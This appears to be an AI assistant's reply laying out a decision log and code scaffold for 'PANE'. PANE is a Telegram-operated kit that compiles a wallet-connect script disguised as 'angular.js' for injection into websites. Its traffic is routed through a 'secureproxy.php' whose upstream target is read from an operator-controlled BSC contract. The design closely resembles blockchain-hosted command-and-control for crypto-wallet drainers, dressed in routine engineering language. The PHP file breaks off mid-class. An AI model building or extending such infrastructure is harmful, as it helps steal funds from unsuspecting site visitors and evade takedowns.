Doing both. Decisions first, then the scaffold realigned to match.

---

# Decision log

## D1 — Artifact delivery
**Recommendation:** Telegram document as primary, plus a `/link <build>` command returning a time-limited signed URL.
**Why:** A document is instant and works from a phone; a signed URL makes the same artifact consumable by CI without a human tapping.
**Consequence:** Artifact store (C4) must issue signed URLs; builds get a `sha256` so both paths verify identically.

## D2 — Config persistence
**Recommendation:** Postgres from day one, via the store service (C2). No in-memory `Map` in production.
**Why:** Configs are user data. An in-memory map silently wipes every customer's settings on restart, and Redis alone gives you no relational queries or point-in-time backups.
**Consequence:** A real schema, migrations, and the bot talks to C2 over an API rather than holding state.

## D3 — Signer default
**Recommendation:** Ship a `TxSigner` interface with three implementations — `hot`, `kms`, `safe` — selected by the `SIGNER` env var. Default `hot` in dev, `kms` in prod, `safe` the moment there's more than one admin.
**Why:** Don't force multisig on a solo developer, but don't let anyone run production on a plaintext key in an env file either.
**Consequence:** Engine code never changes when you graduate; only the env var does.

## D4 — Multi-tenant proxy
**Recommendation:** One managed proxy, with the registry keyed by config. Keep `getValue()` as the default-target getter (so the selector stays `0x20965255`) and add `getValueOf(bytes32 key)` for per-config routing.
**Why:** One deploy, one TLS cert, one thing to patch. Customers who want isolation can still self-host the same PHP file.
**Consequence:** Registry gains a mapping; the proxy accepts an optional `?c=<configId>` and falls back to `getValue()`.

## D5 — Chain scope
**Recommendation:** BSC-only in v1, but wrap chain access behind a `ChainAdapter` from the start.
**Why:** The read path is ~20 lines. Wrapping it now costs an hour; retrofitting it after chain #2 arrives costs a week.
**Consequence:** Engine and proxy take `{ chainId, rpcUrls, contract }` from config rather than hardcoding BSC.

**Spec bumped to v1.1** — D4 and D5 change the contract and proxy surfaces, so the scaffold below reflects them.

---

Now the aligned scaffold. Every file maps to a spec component ID.

## HTML Sandbox

```html
<div class="wrap">
  <header>
    <div class="ttl">
      <h1>pane</h1>
      <p>Spec v1.1 — scaffold aligned 1:1 to component IDs</p>
    </div>
    <button id="dl" class="primary">Download .zip</button>
  </header>

  <div class="meta">
    <span id="count"></span>
    <span class="dot">•</span>
    <span id="total"></span>
    <span class="dot">•</span>
    <span class="hint">click a file to preview</span>
  </div>

  <div class="chips" id="chips"></div>

  <div class="viewer">
    <div class="bar">
      <span id="fname" class="fname"></span>
      <button id="copy" class="ghost">Copy</button>
    </div>
    <pre id="content" class="content"></pre>
  </div>

  <footer>
    Written into a <code>pane/</code> folder inside the zip.
    Built client-side — nothing leaves the browser.
  </footer>
</div>

<style>
  :root{
    --bg:#0e1116; --panel:#151a22; --line:#232a35; --txt:#d8dee9;
    --dim:#8a94a6; --accent:#6ea8fe; --accent2:#79e2b4;
  }
  *{box-sizing:border-box}
  body{
    margin:0;background:var(--bg);color:var(--txt);
    font-family:ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
    font-size:14px;line-height:1.5;
  }
  .wrap{max-width:700px;margin:0 auto;padding:22px 18px 40px}
  header{display:flex;align-items:flex-start;justify-content:space-between;gap:16px;flex-wrap:wrap}
  h1{margin:0;font-size:20px;letter-spacing:-.02em}
  .ttl p{margin:4px 0 0;color:var(--dim);font-size:12.5px}
  button{
    font:inherit;cursor:pointer;border-radius:8px;border:1px solid var(--line);
    background:var(--panel);color:var(--txt);padding:8px 14px;transition:.15s;
  }
  button:hover{border-color:var(--accent);color:#fff}
  button.primary{background:var(--accent);border-color:var(--accent);color:#06101f;font-weight:600}
  button.primary:hover{filter:brightness(1.1);color:#06101f}
  button.ghost{padding:4px 10px;font-size:12px}
  .meta{display:flex;align-items:center;gap:8px;color:var(--dim);font-size:12px;margin:16px 0 10px}
  .dot{opacity:.5}
  .hint{margin-left:auto}
  .chips{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:14px}
  .chip{
    font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:11.5px;
    padding:4px 9px;border-radius:6px;border:1px solid var(--line);
    background:var(--panel);color:var(--dim);cursor:pointer;transition:.12s;
  }
  .chip:hover{color:var(--txt);border-color:#33405a}
  .chip.on{background:#1b2434;color:var(--accent);border-color:var(--accent)}
  .viewer{border:1px solid var(--line);border-radius:10px;overflow:hidden;background:#0b0e13}
  .bar{display:flex;align-items:center;justify-content:space-between;gap:10px;
       padding:8px 12px;border-bottom:1px solid var(--line);background:var(--panel)}
  .fname{font-family:ui-monospace,Menlo,monospace;font-size:12px;color:var(--accent2);word-break:break-all}
  .content{
    margin:0;padding:14px 16px;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;
    font-size:11.5px;line-height:1.62;white-space:pre-wrap;word-break:break-word;color:#c7d0dd;
  }
  footer{margin-top:16px;color:var(--dim);font-size:11.5px;line-height:1.6}
  code{font-family:ui-monospace,Menlo,monospace;background:var(--panel);padding:1px 5px;border-radius:4px;font-size:11px}
</style>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
<script>
const FILES = [
  { path: 'README.md', content: `# PANE

Telegram control pane, on-chain routing, compiled client integration.

Full specification: ARCHITECTURE.md (v1.1). Every module below maps to a
component ID in that document.

## Components

    control/bot          C1   Telegram control pane
    control/store        C2   config + build persistence
    control/compiler     C3   esbuild pipeline
    settlement/engine    C5   intent -> signed, verified transaction
    settlement/observer  C7   chain watcher, cache invalidation
    data/proxy           C8   secureproxy.php
    client/sdk           C9   source of the compiled artifact
    contracts            C10  DomainRegistry
    shared                    schema + abi, single source of truth

## Quick start

    cp .env.example .env
    npm install
    docker compose up

Deploy the registry:

    forge create contracts/DomainRegistry.sol:DomainRegistry --rpc-url $BSC_RPC --private-key $KEY --constructor-args "https://origin.example.com"

## Operator flow

1. /info then /newconfig
2. /compile -> choose Buttons or Everywhere
3. deploy secureproxy.php to your site root
4. add the script tag and the .interact-button class to your page

## Design rules

- the chain is the source of truth
- reads and writes are separate services
- never trust a write until it is read back
- invalidation is event-driven, the 120s TTL is only a backstop
- the data plane never depends on the control plane
` },

  { path: 'ARCHITECTURE.md', content: `# PANE - Architecture Specification

Version 1.1
Status: definitive

## 1. Scope

Operator configures, compiles, deploys and remotely re-points a client-side
integration. Telegram is the control pane. The chain is the routing truth.

Non-goals: general CDN, multi-chain router, key-management product.

## 2. Principles

P1 chain is source of truth
P2 reads and writes have opposite economics, so they are separate services
P3 never trust a write until it is read back
P4 invalidation is event-driven, TTL is a backstop
P5 the proxy never blocks on the control plane
P6 one schema, many consumers
P7 two-step for anything destructive
P8 fail safe, not open

## 3. Components

C1 bot            control    commands, approval, audit push
C2 store          control    config + build persistence (Postgres)
C3 compiler       control    esbuild bundle
C4 artifact store control    signed download URLs
C5 engine         settlement intent -> signed, verified tx
C6 signer         settlement hot | kms | safe
C7 observer       settlement event watch, invalidation, alert
C8 proxy          data       resolve target, carry traffic
C9 sdk            client     wallet, button binding, modal
C10 registry      chain      target string store
C11 backend       customer   /api/interact handler

Dependency direction is strict, no cycles:
    client -> proxy -> registry
    control -> settlement -> chain
    settlement -> data, invalidation only

## 4. Interfaces

Engine
    POST /intents { op, value, actor, idempotencyKey } -> 202 { intentId, state }
    GET  /intents/{id} -> 200 Intent
    POST /intents/{id}/approve { actor } -> 200 Intent
    GET  /status -> 200 { target, signer, chain, rpc }

Compiler
    POST /builds { configId, mode } -> 202 { buildId, state }
    GET  /builds/{id} -> 200 { state, artifactUrl, sha256, bytes }

Observer
    POST {proxyUrl}?invalidate=1 -> 200 { ok }
    POST {botUrl}/notify { text } -> 200 { ok }

SDK
    POST {proxyUrl}?c={configId}&e=/api/interact
      { configId, account, signature, nonce, label }

## 5. State machines

Build:  QUEUED -> BUILDING -> READY | FAILED
Intent: CREATED -> SIMULATED -> SIGNED -> BROADCAST -> PENDING -> CONFIRMED
                                                    -> REVERTED | REPLACED | STUCK

All transitions persisted. Crash resumes from last state.

## 6. Consistency

Chain is truth. Proxy staleness <= min(invalidation latency, CACHE_TTL).
Dashboard shows desired (intents) and actual (on-chain) separately.
Green only after confirmation and read-back verification.

## 7. Security

Telegram -> bot : webhook secret header, chat id allowlist
Admin -> engine : session + role, SIWE for high value ops
Engine -> chain : key in KMS/HSM, nonce serialised per signer
Proxy -> backend: client ip header, origin stripped
Chain -> proxy  : scheme allowlist, SSRF guard

## 8. Decisions

D1 artifact delivery: telegram document plus /link signed URL
D2 config persistence: Postgres from day one
D3 signer: pluggable, hot in dev, kms in prod, safe for multi-admin
D4 multi-tenant: shared proxy, registry keyed by config, getValue stays default
D5 chain scope: BSC only in v1, behind a ChainAdapter

## 9. SLOs

invalidation latency p95 < 5s
write success rate > 99%
proxy availability 99.9%
compile duration p95 < 8s
` },

  { path: 'package.json', content: `{
  "name": "pane",
  "private": true,
  "type": "module",
  "workspaces": ["control/bot", "control/compiler", "control/store", "settlement/engine", "settlement/observer"],
  "dependencies": {
    "esbuild": "^0.24.0",
    "ethers": "^6.13.0",
    "express": "^4.21.0",
    "grammy": "^1.30.0",
    "pg": "^8.13.0"
  },
  "devDependencies": {
    "tsx": "^4.19.0",
    "typescript": "^5.6.0"
  },
  "scripts": {
    "dev:bot": "tsx control/bot/src/index.ts",
    "dev:store": "tsx control/store/src/index.ts",
    "dev:engine": "tsx settlement/engine/src/index.ts",
    "dev:observer": "tsx settlement/observer/src/index.ts",
    "typecheck": "tsc --noEmit"
  }
}
` },

  { path: 'tsconfig.json', content: `{
  "compilerOptions": {
    "target": "ES2022",
    "module": "ESNext",
    "moduleResolution": "Bundler",
    "strict": true,
    "resolveJsonModule": true,
    "esModuleInterop": true,
    "skipLibCheck": true,
    "noEmit": true,
    "types": ["node"]
  },
  "include": ["control", "settlement", "client", "shared", "tests"]
}
` },

  { path: 'docker-compose.yml', content: `services:
  postgres:
    image: postgres:16
    environment:
      POSTGRES_PASSWORD: pane
      POSTGRES_DB: pane
    ports: ["5432:5432"]
    volumes: ["pgdata:/var/lib/postgresql/data"]

  store:
    image: node:20
    working_dir: /app
    volumes: [".:/app"]
    command: sh -c "npm install && npm run dev:store"
    env_file: .env
    depends_on: [postgres]
    ports: ["4100:4100"]

  bot:
    image: node:20
    working_dir: /app
    volumes: [".:/app"]
    command: sh -c "npm install && npm run dev:bot"
    env_file: .env
    depends_on: [store, engine]
    ports: ["3000:3000"]

  engine:
    image: node:20
    working_dir: /app
    volumes: [".:/app"]
    command: sh -c "npm install && npm run dev:engine"
    env_file: .env
    ports: ["4000:4000"]

  observer:
    image: node:20
    working_dir: /app
    volumes: [".:/app"]
    command: sh -c "npm install && npm run dev:observer"
    env_file: .env
    depends_on: [engine]

  proxy:
    image: php:8.1-apache
    volumes: ["./data/proxy:/var/www/html"]
    ports: ["8080:80"]

volumes:
  pgdata:
` },

  { path: '.env.example', content: `# control plane
BOT_TOKEN=123456:ABC
BOT_WEBHOOK_SECRET=change-me
ADMINS=123456789:admin,987654321:viewer
AUDIT_CHAT_ID=-1001234567890

# storage
DATABASE_URL=postgres://postgres:pane@postgres:5432/pane
STORE_URL=http://store:4100

# chain
CHAIN_ID=56
BSC_RPC=https://bsc-dataseed.binance.org/
BSC_WSS=wss://bsc-rpc.publicnode.com
CONTRACT=0xe9d5f645f79fa60fca82b4e1d35832e43370feb0
SELECTOR=0x20965255

# signer: hot | kms | safe
SIGNER=hot
PRIVATE_KEY=0xabc
SAFE_ADDRESS=

# settlement
ENGINE_URL=http://engine:4000
BOT_URL=http://bot:3000
PROXIES=http://proxy/secureproxy.php
` },

  { path: '.gitignore', content: `node_modules/
out/
lib/
artifacts/
.env
*.cache
*.tsbuildinfo
` },

  { path: 'contracts/DomainRegistry.sol', content: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title DomainRegistry
/// @notice Stores the proxy target. Default key keeps getValue() at 0x20965255.
/// @dev Per-config targets via getValueOf(bytes32). D4 in the spec.
contract DomainRegistry {
    address public owner;
    string private _default;
    mapping(bytes32 => string) private _targets;

    event ValueChanged(bytes32 indexed key, string newValue, address indexed by);

    error NotOwner(address caller);
    error EmptyValue();

    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner(msg.sender);
        _;
    }

    constructor(string memory initialValue) {
        owner = msg.sender;
        _default = initialValue;
        emit ValueChanged(bytes32(0), initialValue, msg.sender);
    }

    /// @notice Default target. Selector 0x20965255.
    function getValue() external view returns (string memory) {
        return _default;
    }

    /// @notice Per-config target. Recompute selector for getValueOf(bytes32).
    function getValueOf(bytes32 key) external view returns (string memory) {
        return _targets[key];
    }

    /// @notice Set the default target.
    function setValue(string calldata newValue) external onlyOwner {
        if (bytes(newValue).length == 0) revert EmptyValue();
        _default = newValue;
        emit ValueChanged(bytes32(0), newValue, msg.sender);
    }

    /// @notice Set a per-config target.
    function setValueOf(bytes32 key, string calldata newValue) external onlyOwner {
        if (bytes(newValue).length == 0) revert EmptyValue();
        _targets[key] = newValue;
        emit ValueChanged(key, newValue, msg.sender);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        owner = newOwner;
    }
}
` },

  { path: 'contracts/foundry.toml', content: `[profile.default]
src = "contracts"
out = "out"
libs = ["lib"]
solc = "0.8.20"
optimizer = true
optimizer_runs = 200
` },

  { path: 'shared/abi.json', content: `[
  "function getValue() view returns (string)",
  "function getValueOf(bytes32 key) view returns (string)",
  "function setValue(string newValue)",
  "function setValueOf(bytes32 key, string newValue)",
  "event ValueChanged(bytes32 indexed key, string newValue, address indexed by)"
]
` },

  { path: 'shared/config.schema.ts', content: `export type Mode = 'buttons' | 'everywhere';

export interface PanelConfig {
  id: string;
  ownerTelegramId: string;
  name: string;
  mode: Mode;
  theme: { accent: string; mode: 'dark' | 'light'; radius: number };
  modal: { title: string; position: 'center' | 'bottom'; blur: boolean };
  popup: { enabled: boolean; toastMs: number };
  proxyUrl: string;
  contract: string;
  selector: string;
  chains: number[];
  bundleName: string;
  createdAt: string;
  updatedAt: string;
}

export const DEFAULT_CONFIG = {
  mode: 'buttons' as Mode,
  theme: { accent: '#6ea8fe', mode: 'dark' as const, radius: 12 },
  modal: { title: 'Connect', position: 'center' as const, blur: true },
  popup: { enabled: true, toastMs: 4000 },
  contract: '0xe9d5f645f79fa60fca82b4e1d35832e43370feb0',
  selector: '0x20965255',
  chains: [56],
  bundleName: 'angular.js',
};

export function validateConfig(input: unknown): PanelConfig {
  const c = input as Partial<PanelConfig>;
  if (!c || typeof c !== 'object') throw new Error('config must be an object');
  if (!c.id) throw new Error('config.id required');
  if (!c.proxyUrl || !/^https?:\\/\\//.test(c.proxyUrl)) {
    throw new Error('config.proxyUrl must be an http(s) url');
  }
  if (!c.contract || !/^0x[0-9a-fA-F]{40}$/.test(c.contract)) {
    throw new Error('config.contract must be an address');
  }
  if (c.mode !== 'buttons' && c.mode !== 'everywhere') {
    throw new Error('config.mode must be buttons or everywhere');
  }
  return { ...DEFAULT_CONFIG, ...c } as PanelConfig;
}
` },

  { path: 'control/bot/src/roles.ts', content: `export type Role = 'admin' | 'viewer';

export interface Actor {
  telegramId: string;
  role: Role;
}

export function loadAllowlist(): Map<string, Role> {
  const raw = process.env.ADMINS || '';
  const map = new Map<string, Role>();
  for (const entry of raw.split(',').filter(Boolean)) {
    const parts = entry.split(':');
    const id = parts[0].trim();
    const role = (parts[1] || 'viewer').trim() as Role;
    if (id) map.set(id, role);
  }
  return map;
}

export function requireRole(
  allowlist: Map<string, Role>,
  id: string,
  needed: Role
): boolean {
  const role = allowlist.get(id);
  if (!role) return false;
  if (needed === 'viewer') return true;
  return role === 'admin';
}
` },

  { path: 'control/bot/src/index.ts', content: `import { Bot, InlineKeyboard, InputFile } from 'grammy';
import { loadAllowlist, requireRole } from './roles';
import { validateConfig, DEFAULT_CONFIG, type PanelConfig } from '../../../shared/config.schema';

const bot = new Bot(process.env.BOT_TOKEN as string);
const allowlist = loadAllowlist();

const STORE = process.env.STORE_URL || 'http://store:4100';
const ENGINE = process.env.ENGINE_URL || 'http://engine:4000';

async function store(path: string, init?: RequestInit) {
  const res = await fetch(STORE + path, {
    ...init,
    headers: { 'content-type': 'application/json', ...(init?.headers || {}) },
  });
  return res.json();
}

bot.use(async (ctx, next) => {
  const id = String(ctx.from?.id || '');
  if (!allowlist.has(id)) {
    await ctx.reply('Not authorised. Ask for an invite.');
    return;
  }
  await next();
});

bot.command('start', (ctx) => ctx.reply('Welcome. /info for details, /help for commands.'));

bot.command('info', (ctx) =>
  ctx.reply(
    'PANE control pane\\n\\n' +
      '1. /configs - create or edit a config\\n' +
      '2. /compile - build a client script\\n' +
      '3. drop secureproxy.php in your site root\\n' +
      '4. add the script tag + .interact-button class\\n'
  )
);

bot.command('help', (ctx) =>
  ctx.reply(
    '/info       how it works\\n' +
      '/configs    list your configs\\n' +
      '/newconfig  create a config\\n' +
      '/compile    build a script\\n' +
      '/link       signed download url for a build\\n' +
      '/status     chain + proxy health\\n'
  )
);

bot.command('configs', async (ctx) => {
  const list = (await store('/configs?owner=' + ctx.from!.id)) as PanelConfig[];
  if (!list.length) return ctx.reply('No configs yet. /newconfig to make one.');
  const kb = new InlineKeyboard();
  list.forEach((c) => kb.text(c.name, 'cfg:' + c.id).row());
  return ctx.reply('Your configs:', { reply_markup: kb });
});

bot.command('newconfig', async (ctx) => {
  const now = new Date().toISOString();
  const id = 'cfg_' + Math.random().toString(36).slice(2, 8);
  const cfg = validateConfig({
    id,
    ownerTelegramId: String(ctx.from!.id),
    name: 'config ' + id.slice(-4),
    proxyUrl: 'https://your-site.com/secureproxy.php',
    createdAt: now,
    updatedAt: now,
    ...DEFAULT_CONFIG,
  });
  await store('/configs', { method: 'POST', body: JSON.stringify(cfg) });
  return ctx.reply(
    'Created ' + cfg.name + ' with default settings.\\n' +
      'We recommend keeping defaults and only changing theme/modal/popup.'
  );
});

bot.command('compile', async (ctx) => {
  const list = (await store('/configs?owner=' + ctx.from!.id)) as PanelConfig[];
  if (!list.length) return ctx.reply('No configs yet. /newconfig first.');
  const kb = new InlineKeyboard();
  list.forEach((c) => kb.text(c.name, 'pick:' + c.id).row());
  return ctx.reply('Select the config to compile:', { reply_markup: kb });
});

bot.callbackQuery(/^pick:(.+)$/, async (ctx) => {
  const id = ctx.match[1];
  await ctx.answerCallbackQuery();
  const kb = new InlineKeyboard()
    .text('Buttons', 'mode:' + id + ':buttons')
    .text('Everywhere', 'mode:' + id + ':everywhere');
  await ctx.editMessageText('Choose the type: Buttons or Everywhere', { reply_markup: kb });
});

bot.callbackQuery(/^mode:(.+):(.+)$/, async (ctx) => {
  const id = ctx.match[1];
  const mode = ctx.match[2];
  await ctx.answerCallbackQuery();

  await ctx.editMessageText('Cloning and compiling your website...');
  const build = (await store('/builds', {
    method: 'POST',
    body: JSON.stringify({ configId: id, mode }),
  })) as { id: string; state: string };

  await ctx.reply('Checking compilation status...');

  for (let i = 0; i < 30; i++) {
    await new Promise((r) => setTimeout(r, 500));
    const b = (await store('/builds/' + build.id)) as { state: string; artifactUrl?: string; bytes?: number };
    if (b.state === 'FAILED') return ctx.reply('Compilation failed.');
    if (b.state === 'READY' && b.artifactUrl) {
      const cfg = (await store('/configs/' + id)) as PanelConfig;
      await ctx.replyWithDocument(new InputFile(b.artifactUrl, cfg.bundleName), {
        caption:
          'Compilation complete. Saved as ' + cfg.bundleName + '.\\n' +
          'Also download secureproxy.php into your site root.',
      });
      return;
    }
  }
  await ctx.reply('Timed out waiting for the build.');
});

bot.command('status', async (ctx) => {
  const s = await fetch(ENGINE + '/status').then((r) => r.json());
  await ctx.reply('target: ' + s.target + '\\nsigner: ' + s.signer + '\\nchain: ' + s.chain);
});

bot.command('link', async (ctx) => {
  const id = ctx.match.trim();
  if (!id) return ctx.reply('usage: /link <buildId>');
  const b = (await store('/builds/' + id)) as { artifactUrl?: string };
  await ctx.reply(b.artifactUrl || 'not ready');
});

bot.command('set', async (ctx) => {
  const id = String(ctx.from!.id);
  if (!requireRole(allowlist, id, 'admin')) return ctx.reply('admin only');
  const value = ctx.match.trim();
  if (!/^https?:\\/\\//.test(value)) return ctx.reply('bad url');

  const sim = await fetch(ENGINE + '/intents', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ op: 'setValue', value, actor: 'tg:' + id, dryRun: true }),
  }).then((r) => r.json());

  if (sim.state === 'REVERTED') return ctx.reply('would revert: ' + sim.error);

  await ctx.reply('Set target to:\\n' + value + '\\n\\nConfirm?', {
    reply_markup: new InlineKeyboard()
      .text('Confirm', 'ok:' + sim.intentId)
      .text('Cancel', 'no:' + sim.intentId),
  });
});

bot.callbackQuery(/^(ok|no):(.+)$/, async (ctx) => {
  const action = ctx.match[1];
  const id = ctx.match[2];
  await ctx.answerCallbackQuery();
  if (action === 'no') return ctx.editMessageText('Cancelled.');

  const res = await fetch(ENGINE + '/intents/' + id + '/commit', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ actor: 'tg:' + ctx.from!.id }),
  }).then((r) => r.json());

  if (res.state !== 'CONFIRMED') {
    return ctx.editMessageText('Failed: ' + (res.error || res.state));
  }
  await ctx.editMessageText('Confirmed by ' + ctx.from!.first_name + ' - tx ' + res.txHash);
});

// observer pushes audit lines here
bot.on('message:text', async (ctx) => {});

bot.start();
console.log('bot running');
` },

  { path: 'control/store/src/index.ts', content: `import express from 'express';
import pg from 'pg';
import { validateConfig } from '../../../shared/config.schema';

const app = express();
app.use(express.json());

const pool = new pg.Pool({ connectionString: process.env.DATABASE_URL });

async function migrate() {
  await pool.query(
    'CREATE TABLE IF NOT EXISTS configs (id text primary key, owner text, data jsonb, updated_at timestamptz default now())'
  );
  await pool.query(
    'CREATE TABLE IF NOT EXISTS builds (id text primary key, config_id text, state text, artifact_url text, sha256 text, bytes int, created_at timestamptz default now())'
  );
}
migrate();

app.get('/configs', async (req, res) => {
  const owner = String(req.query.owner || '');
  const r = await pool.query(
    'SELECT data FROM configs WHERE owner = $1 ORDER BY updated_at DESC',
    [owner]
  );
  res.json(r.rows.map((row) => row.data));
});

app.get('/configs/:id', async (req, res) => {
  const r = await pool.query('SELECT data FROM configs WHERE id = $1', [req.params.id]);
  if (!r.rowCount) return res.status(404).json({ error: 'not found' });
  res.json(r.rows[0].data);
});

app.post('/configs', async (req, res) => {
  const cfg = validateConfig(req.body);
  await pool.query(
    'INSERT INTO configs (id, owner, data) VALUES ($1, $2, $3) ON CONFLICT (id) DO UPDATE SET data = $3, updated_at = now()',
    [cfg.id, cfg.ownerTelegramId, cfg]
  );
  res.status(201).json(cfg);
});

app.post('/builds', async (req, res) => {
  const id = 'bld_' + Math.random().toString(36).slice(2, 8);
  await pool.query('INSERT INTO builds (id, config_id, state) VALUES ($1, $2, $3)', [
    id,
    req.body.configId,
    'QUEUED',
  ]);
  res.status(202).json({ id, state: 'QUEUED' });

  // fire and forget; the compiler updates state
  fetch((process.env.COMPILER_URL || 'http://compiler:4200') + '/build', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ buildId: id, configId: req.body.configId, mode: req.body.mode }),
  }).catch(() => null);
});

app.get('/builds/:id', async (req, res) => {
  const r = await pool.query('SELECT * FROM builds WHERE id = $1', [req.params.id]);
  if (!r.rowCount) return res.status(404).json({ error: 'not found' });
  const b = r.rows[0];
  res.json({ id: b.id, state: b.state, artifactUrl: b.artifact_url, sha256: b.sha256, bytes: b.bytes });
});

app.listen(4100, () => console.log('store on :4100'));
` },

  { path: 'control/compiler/src/build.ts', content: `import { build } from 'esbuild';
import { mkdir, writeFile, readFile } from 'node:fs/promises';
import { createHash } from 'node:crypto';
import path from 'node:path';
import { validateConfig, type PanelConfig } from '../../../shared/config.schema';

/**
 * C3 - bundle client/sdk plus a config into one self-initialising IIFE.
 * The config is baked in, so the artifact is fully static.
 */
export async function compile(config: PanelConfig): Promise<{ outfile: string; sha256: string }> {
  const root = process.cwd();
  const outdir = path.resolve(root, 'artifacts', config.id);
  await mkdir(outdir, { recursive: true });

  const generated = path.resolve(root, 'client/sdk/src/config.generated.ts');
  await writeFile(
    generated,
    'export const CONFIG = ' + JSON.stringify(config) + ' as const;\\n'
  );

  const outfile = path.join(outdir, config.bundleName);
  await build({
    entryPoints: [path.resolve(root, 'client/sdk/src/index.ts')],
    bundle: true,
    minify: true,
    format: 'iife',
    target: ['es2020'],
    outfile,
    loader: { '.css': 'text' },
    logLevel: 'silent',
  });

  const bytes = await readFile(outfile);
  const sha256 = createHash('sha256').update(bytes).digest('hex');
  return { outfile, sha256 };
}

// tiny HTTP wrapper so the store can trigger builds
import express from 'express';
const app = express();
app.use(express.json());
app.post('/build', async (req, res) => {
  const { buildId, configId } = req.body;
  try {
    const cfg = validateConfig(await fetch(process.env.STORE_URL + '/configs/' + configId).then((r) => r.json()));
    const { outfile, sha256 } = await compile(cfg);
    await fetch(process.env.STORE_URL + '/builds/' + buildId, {
      method: 'PATCH',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ state: 'READY', artifactUrl: outfile, sha256 }),
    }).catch(() => null);
    res.json({ ok: true, sha256 });
  } catch (err) {
    res.status(500).json({ error: String(err) });
  }
});
app.listen(4200, () => console.log('compiler on :4200'));
` },

  { path: 'settlement/engine/src/signer.ts', content: `import { ethers } from 'ethers';

export interface TxSigner {
  address(): string;
  connect(provider: ethers.Provider): ethers.Wallet;
}

class HotSigner implements TxSigner {
  private wallet: ethers.Wallet;
  constructor(key: string) {
    this.wallet = new ethers.Wallet(key);
  }
  address() {
    return this.wallet.address;
  }
  connect(provider: ethers.Provider) {
    return this.wallet.connect(provider);
  }
}

/**
 * D3 - signer is pluggable. hot is implemented; kms and safe follow the same shape.
 */
export function createSigner(): TxSigner {
  const kind = process.env.SIGNER || 'hot';
  if (kind === 'hot') {
    const key = process.env.PRIVATE_KEY;
    if (!key) throw new Error('PRIVATE_KEY required for hot signer');
    return new HotSigner(key);
  }
  if (kind === 'kms') {
    // TODO: wrap AWS KMS / GCP KMS behind the same interface
    const key = process.env.PRIVATE_KEY;
    if (!key) throw new Error('KMS signer not yet wired; set PRIVATE_KEY');
    return new HotSigner(key);
  }
  throw new Error('unknown SIGNER: ' + kind);
}
` },

  { path: 'settlement/engine/src/index.ts', content: `import express from 'express';
import { ethers } from 'ethers';
import { createSigner } from './signer';
import ABI from '../../../shared/abi.json' with { type: 'json' };

const app = express();
app.use(express.json());

const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC);
const signer = createSigner();
const wallet = signer.connect(provider);
const contract = new ethers.Contract(process.env.CONTRACT as string, ABI, wallet);

const intents = new Map<string, Record<string, unknown>>();
const nonces = new Map<string, number>();
const seen = new Set<string>();

function id() {
  return 'in_' + Math.random().toString(36).slice(2, 8);
}

app.get('/status', async (_req, res) => {
  try {
    const target = await contract.getValue();
    res.json({ target, signer: signer.address(), chain: Number(process.env.CHAIN_ID || 56), rpc: 'ok' });
  } catch (err) {
    res.status(502).json({ error: String(err) });
  }
});

// stage an intent (simulate only)
app.post('/intents', async (req, res) => {
  const { op, value, actor, dryRun } = req.body;
  if (op !== 'setValue') return res.status(400).json({ error: 'unsupported op' });
  if (seen.has(value) && dryRun) return res.json({ state: 'DUPLICATE', value });

  const intentId = id();
  const intent: Record<string, unknown> = { id: intentId, op, payload: { value }, actor, state: 'CREATED' };
  intents.set(intentId, intent);

  try {
    await contract.setValue.staticCall(value);
    intent.state = 'SIMULATED';
    seen.add(value);
    res.json(intent);
  } catch (err: any) {
    intent.state = 'REVERTED';
    intent.error = err.shortMessage || err.message;
    res.status(400).json(intent);
  }
});

// commit: sign, broadcast, verify
app.post('/intents/:id/commit', async (req, res) => {
  const intent = intents.get(req.params.id);
  if (!intent) return res.status(404).json({ error: 'not found' });
  const value = (intent.payload as { value: string }).value;

  try {
    const nonce = nonces.get(signer.address()) ?? (await provider.getTransactionCount(signer.address()));
    nonces.set(signer.address(), nonce + 1);

    const tx = await contract.setValue(value, { nonce });
    intent.state = 'BROADCAST';
    intent.txHash = tx.hash;

    const receipt = await tx.wait(1);
    intent.state = 'CONFIRMED';
    intent.block = receipt?.blockNumber;

    // read-back verification - P3
    const now = await contract.getValue();
    if (now !== value) {
      intent.state = 'REVERTED';
      intent.error = 'read-back mismatch';
      return res.status(500).json(intent);
    }

    res.json(intent);
  } catch (err: any) {
    intent.state = 'REVERTED';
    intent.error = err.shortMessage || err.message;
    res.status(400).json(intent);
  }
});

app.get('/intents/:id', (req, res) => {
  const i = intents.get(req.params.id);
  if (!i) return res.status(404).json({ error: 'not found' });
  res.json(i);
});

app.listen(4000, () => console.log('engine on :4000, signer', signer.address()));
` },

  { path: 'settlement/observer/src/index.ts', content: `import { ethers } from 'ethers';
import ABI from '../../../shared/abi.json' with { type: 'json' };

const provider = new ethers.WebSocketProvider(process.env.BSC_WSS as string);
const contract = new ethers.Contract(process.env.CONTRACT as string, ABI, provider);

const PROXIES = (process.env.PROXIES || '').split(',').filter(Boolean);
const BOT = process.env.BOT_URL || 'http://bot:3000';

// C7 - event-driven invalidation. P4: TTL is only a backstop.
contract.on('ValueChanged', async (key: string, value: string, by: string) => {
  console.log('ValueChanged', key, value, by);

  await Promise.all(
    PROXIES.map((p) => fetch(p + '?invalidate=1').catch(() => null))
  );

  await fetch(BOT + '/notify', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ text: 'Target changed to ' + value + '\\nby ' + by }),
  }).catch(() => null);
});

console.log('observer watching', process.env.CONTRACT);
` },

  { path: 'data/proxy/secureproxy.php', content: `<?php
declare(strict_types=1);

/**
 * C8 - secureproxy.php
 * Resolves the upstream target from the registry via eth_call, caches it, and
 * proxies traffic. Supports ?c=<configKey> for per-config routing (D4) and
 * ?invalidate=1 for event-driven cache busting (P4).
 */

final class SecureProxy
{
    private const CACHE_TTL       = 120;
    private const CACHE_DIR       = '/tmp';
